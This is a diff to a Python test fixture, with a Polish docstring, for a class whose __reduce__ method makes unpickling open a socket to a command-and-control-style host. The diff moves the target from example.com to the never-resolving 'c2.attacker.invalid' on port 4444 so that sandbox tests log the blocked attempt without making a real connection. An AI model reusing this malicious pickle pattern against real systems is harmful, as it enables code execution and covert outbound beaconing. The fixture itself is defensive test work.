@@ -86,6 +86,13 @@ class NetworkBeacon:
 
     W sandboksie z ``--network=none`` połączenie się nie uda — chodzi
     o to, by log pokazał **próbę** i jej zablokowanie.
+
+    Celem jest nazwa w domenie ``.invalid`` (RFC 2606), która z definicji
+    nigdy się nie rozwiązuje. Wcześniej stało tu ``example.com`` i fixture
+    puszczony poza kontenerem nawiązywał PRAWDZIWE połączenie wychodzące —
+    czyli robił dokładnie to, czego ten projekt zabrania. Nazwa zamiast
+    samego adresu zostaje, bo w logu czytelniej widać, do czego payload
+    próbował się dobić.
     """
 
     def __reduce__(self):
@@ -93,7 +100,7 @@ class NetworkBeacon:
 
         return (
             socket.create_connection,
-            (("example.com", 80), 3),
+            (("c2.attacker.invalid", 4444), 3),
         )
 
 
